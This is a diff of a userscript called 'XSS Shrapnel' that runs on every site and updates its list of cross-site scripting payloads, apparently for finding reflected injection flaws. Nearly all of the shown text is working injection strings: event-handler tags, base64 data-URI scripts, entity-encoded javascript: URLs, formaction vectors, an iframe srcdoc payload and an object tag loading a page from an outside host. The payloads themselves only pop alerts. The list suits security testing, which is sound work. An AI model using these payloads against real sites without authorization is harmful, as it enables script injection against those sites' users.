@@ -1,9 +1,9 @@
 // ==UserScript==
 // @name        XSS Shrapnel
 // @namespace   *
-// @description aaa"bbb'ccc<ddd>zzz
+// @description aaa"bbb'{{3*3}}<ddd>zzz
 // @include     *
-// @version     2.6
+// @version     2.7
 // @grant       none
 // ==/UserScript==
 
@@ -15,7 +15,7 @@ var iPayload = 0
 var aPayloads = ['aaa"bbb\'{{3*3}}<ddd>zzz', 
 		 'aaa"{{3*3}}\'zzz', 
 		 'aaa"{{3*3}}zzz', 
-		 'aaa\\"bbb\\\'>ccc<<ddd>ddd<ddd>>zzz<fff', 
+		 'aaa\\"bbb\\\'>ccc<<ddd>ddd<ddd>>zzz<fff <fff', 
 		 'aaa\\"bbb\\\'ccc<ddd >zzz</fff>', 
 		 '</title></textarea>aaa"bbb\'ccc<ddd>zzz', 
 		 'aaa"><svg onload=alert(document.domain)>zzz', 
@@ -25,13 +25,19 @@ var aPayloads = ['aaa"bbb\'{{3*3}}<ddd>zzz',
 		 'aaa\'-alert(document.domain)-\'zzz', 
 		 'aaa"-alert(document.domain)-"zzz', 
 		 'aaa"><video src onratechange=prompt(document.domain)>zzz', 
+		 'aaa"><object data=http://spqr.zz.mu/xss.html>zzz', 
+		 'aaa"><embed src=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>zzz', 
 		 'aaa"><xxx onbeforescriptexecute=prompt(document.domain)>zzz', 
-		 'aaa"><object allowscriptaccess=always data=http://spqr.zz.mu/xss.swf>zzz', 
 		 'aaa"><meta http-equiv=refresh content="0;URL=http://youtu.be/dQw4w9WgXcQ">zzz', 
-		 'aaa"><form action=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>zzz', 
-		 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>zzz']
+		 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>zzz', 
+		 'aaa"><math href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</math>zzz', 
+		 'aaa"><math href=&#x64;&#x61;&#x74;&#x61;:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</math>zzz', 
+		 'aaa"><math href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:\u0061\u006C\u0065\u0072\u0074(document.domain)>XSS</math>zzz', 
+		 'aaa"><form method=post action=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+><input type=submit value=XSS>zzz', 
+		 'aaa"><form><button formaction=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</button>zzz', 
+		 'aaa"><iframe srcdoc=&lt;&#x73;&#x76;&#x67;&#x2F;&#x6F;&#x6E;&#x6C;&#x6F;&#x61;&#x64;&equals;&#x61;&#x6C;&#x65;&#x72;&#x74;&lpar;document.domain&rpar;&gt;>zzz']
 
-var regex = /.{0,100}aaa.{0,130}?zzz.{0,100}/gi
+var regex = /.{0,100}aaa.{0,150}?zzz.{0,100}/gi
 
 window.addEventListener
 (
